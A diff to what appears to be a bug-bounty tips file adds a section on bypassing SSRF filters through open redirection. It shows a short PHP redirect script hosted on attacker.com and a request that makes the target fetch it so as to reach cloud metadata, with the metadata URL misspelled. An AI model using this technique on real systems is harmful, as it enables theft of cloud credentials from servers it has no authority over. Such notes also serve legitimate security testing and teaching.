@@ -31,3 +31,25 @@ Sometimes if any user input data is send to email ! Try it for HTML injection.
 
 Always try to Bruteforce all HTTP methods on API Endpoints It can lead to some devastating results.
 
+---
+
+#### External SSRF Bypass with Open Redirection
+
+The External SSRF can be easily used to get cloud Metadata through Redirection Technique
+
+Example:
+
+if `Target.com/vul.php?url=amazon.com/matadata` is blocked
+
+make an `redirect.php` on you server
+```php
+<?php
+header("Location: amazon.com/matadata");
+?>
+```
+
+then try `Target.com/vul.php?url=attacker.com/redirect.php` 
+
+__Refrence__
+
+[https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437](https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437)
